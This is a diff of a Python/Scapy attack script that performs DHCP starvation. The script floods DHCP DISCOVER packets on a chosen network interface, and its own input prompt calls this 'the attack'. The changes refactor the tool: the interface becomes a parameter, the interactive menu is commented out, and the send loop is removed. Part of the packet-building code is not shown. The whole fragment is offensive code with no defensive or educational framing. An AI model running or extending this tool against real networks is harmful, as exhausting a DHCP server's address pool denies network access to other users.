@@ -16,8 +16,11 @@ else :
 
     listInterfaces = netifaces.interfaces()
 
+def getInterfaces() :
+    return listInterfaces
 
-def DHCPstarving() :
+
+def DHCPstarving(inter) :
     conf.checkIPaddr = False  # Disabling the IP address checking
 
     # Building the DISCOVER packet
@@ -30,13 +33,11 @@ def DHCPstarving() :
                 / DHCP(options=[('message-type','discover'), ('end')])
 
 
-    for i in range(len(listInterfaces)) :
+    """ for i in range(len(listInterfaces)) :
         print (str(i+1)+') ', listInterfaces[i])    
 
     number = int(input("Select a number to start the attack :"))
     while (number > len(listInterfaces)) :
-        number = int(input("Enter a valid number :"))
+        number = int(input("Enter a valid number :")) """
 
-    sendp(DHCP_DISCOVER, iface=listInterfaces[number-1],loop=1,verbose=1 )
-
-DHCPstarving()
+    sendp(DHCP_DISCOVER, iface=inter)
